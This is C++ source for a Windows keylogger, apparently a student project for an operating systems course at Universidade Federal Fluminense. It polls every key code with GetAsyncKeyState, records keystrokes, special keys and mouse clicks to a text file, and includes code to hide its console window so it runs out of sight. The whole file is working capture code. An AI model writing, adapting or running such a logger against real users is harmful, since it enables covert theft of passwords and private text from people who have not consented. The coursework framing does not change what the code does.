//Código desenvolvido para a Disciplina de Sistemas Operacionais
//Universidade Federal Fluminense - UFF
//Computação - 5º período
//Alunos: Silvia, Raphael e Raul
//Profº: Marcos Vinicius

# include <windows.h>
# include <iostream>
#include <fstream>
//# include <cstdlib>

using namespace std;

int main()
{
    int r,t,num;
    int caps=0;
    string x,fun;
    int x1=0;
    int x2=0;
    //ShowWindow(hidden,0);
    //ShowWindow( GetConsoleWindow(), SW_HIDE );
    ofstream ofs ("teclas.txt", ofstream::out); //cria um arquivo

    for(t=0; t<=255; t++)
    {
        Sleep(0.1); //delay
        r = GetAsyncKeyState(t); //verifica tecla
        if(r==-32767) //se for verdadeiro
        {
            if((caps==0)&&(t==20))caps=1;
             else if((caps==1)&&(t==20))caps=0;
            if((caps==0)&&((t>=65)&&(t<=90)))t=t+32;
            x1=GetKeyState(t);


            if((t>=112)and(t<=123))
            {
               x1=GetKeyState(t);
               if((x1==-128)or(x1==-127)) //F1 .. F12
               {
                   cout<<"x: "<<"F"<<t-111<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs <<"[F"<<t-111<<"] ";
               }else
               {
                   x=t;
                   ofs << x<<" ";
                   cout<<"x: "<< x<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl; //não identifica
               }
            }else if((t>=97)and(t<=105))
            {
                x1=GetKeyState(t);
                //cout<<"numlock teste ;"<<num<<endl;
                if((x1==-128)or(x1==-127))
                {
                      //cout<<"Numlock ligado"<<endl;
                   int aux=t-96;
                   cout<<"x: Numpad "<<aux<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Numpad: "<<aux<<"] ";
                }else
                {
                   x=t;
                   ofs << x<<" ";
                   cout<<"x: "<< x<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                }
            }else switch (t)
            {
                case 1: //mouse esquerdo
                   cout<<"x: Mouse E"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Mouse E] ";
                break;
                case 2: //mouse direito
                   cout<<"x: Mouse D"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Mouse D] ";
                break;
                case 4: //botão do mouse
                   cout<<"x: MouseScroll"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[MouseScroll] ";
                break;
                case 8: //apagar
                   cout<<"x: BackSpace"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[BackSpace] ";
                break;
                case 9: //tab
                   cout<<"x: TAB"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[TAB] ";
                break;
                case 13: //enter
                   cout<<"x: Enter"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Enter] ";
                break;
                case 20: //FIXA
                   cout<<"x: CapsLock"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[CapsLock] ";
                break;
                case 16://shift
                break;
                case 17://ctrl
                break;
                case 18://alt
                break;
                case 33: //Pagina pra cima
                   cout<<"x: PgUp"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[PgUp] ";
                break;
                case 34: //pagina pra baixo
                   cout<<"x: PgDw"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[PgDw] ";
                break;
                case 35: //fim
                   cout<<"x: End"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[End] ";
                break;
                case 36: //casinha
                   cout<<"x: Home"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Home] ";
                break;
                case 37: //seta pra esquerda
                   cout<<"x: Seta E"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Seta E] ";
                break;
                case 38: //seta pra cima
                   cout<<"x: Seta C"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Seta C] ";
                break;
                case 39: //seta pra direita
                   cout<<"x: Seta D"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Seta D] ";
                break;
                case 40: //seta pra baixo
                   cout<<"x: Seta B"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Seta B] ";
                break;
                case 44: //printar a tela
                   cout<<"x: Print"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Print] ";
                break;
                case 45: //insert
                   cout<<"x: Insert"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Insert] ";
                break;
                case 46: //deleta
                   cout<<"x: delet"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[delet] ";
                break;
                case 91: //janelinha
                   cout<<"x: windows"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[windows] ";
                break;
                case 93: //menu
                   cout<<"x: menu"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[menu] ";
                break;
                case 144:
                    //int num;
                   //num=GetKeyState(144);
                  // cout<<"num: "<<num<<endl;
                   cout<<"x: NumLock"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[NumLock] ";
                break;
                case 145: //bloqueio do scroll
                   cout<<"x: ScrollLock"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[ScrollLock] ";
                break;
                case 160: //shift esquerdo
                   cout<<"x: shift E"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[shift E] "; //escreve no arquivo
                break;
                case 161: //shift direito
                    //int t1,t2;
                    // char vai;

                   cout<<"x: shift D"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[shift D] ";
                     // system("pause"); nao funciona
                      //vai=GetKeyState(65);
                      //cout<<"x: "<<vai<<endl;

                break;
                case 162: //control esquerdo
                   cout<<"x: ctrl E"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[ctrl E] ";
                break;
                case 163: //control direito
                   cout<<"x: ctrl D"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[ctrl D] ";
                break;
                case 164: //alt
                   cout<<"x: alt "<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[alt] ";
                break;
                case 165: //alt gr
                   cout<<"x: alt Gr"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[alt Gr] ";
                break;
                case 174: //vol -
                   cout<<"x: Vol-"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Vol-] ";
                break;
                case 175: //vol +
                   cout<<"x: Vol+"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[Vol+] ";
                break;
                case 187: //igual
                   cout<<"x: ="<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[=] ";
                break;
                case 188: //virgula
                   cout<<"x: ,"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[,] ";
                break;
                case 189: //-
                   cout<<"x: -"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[-] ";
                break;
                case 190: //ponto
                   cout<<"x: ."<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[.] ";
                break;
                case 191: //ponto e virgula
                   cout<<"x: ;"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[;] ";
                break;
                case 192: //aspa simples
                   cout<<"x: '"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"['] ";
                break;
                case 193: //aspas duplas
                   cout<<"x: /"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[/] ";
                break;
                case 219: //acento
                   cout<<"x: ´"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[´] ";
                break;
                case 220: //colchete direito
                   cout<<"x: ]"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"] ";
                break;
                case 221: //colchete esquerdo
                   cout<<"x: ["<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[ ";
                break;
                case 222: //til
                   cout<<"x: ~"<<endl;
                   cout<<"t: "<< t<<endl;
                   cout<<"x1: "<<x1<<endl;
                   ofs<<"[~] ";
                break;



                default: //caso de erro
                  x=t;
                  ofs << x<<" ";
                  cout<<"x: "<< x<<endl;
                  cout<<"t: "<< t<<endl;
                  cout<<"x1: "<<x1<<endl; //vazio
                break;
            }

            //x=t;

           // cout<<"t: "<< t<<endl;
            //cout<<"x1: "<<x1<<endl;
            if (t==27)
            {
               ofs.close();
               //cout<<"fecha";
               break;
            }
            if (t==88){ ShowWindow( GetConsoleWindow(), SW_RESTORE ); } //88 120 mostra console
            if (t==89){ ShowWindow( GetConsoleWindow(), SW_HIDE ); }//89 113 esconde console
        }

        if(t==255)
        {
            t=0;
        }
        //fclose(arquivo);


    }
    //fclose(arquivo);
    ofs.close(); //salva arquivo
    return 0; //retorna 0
}

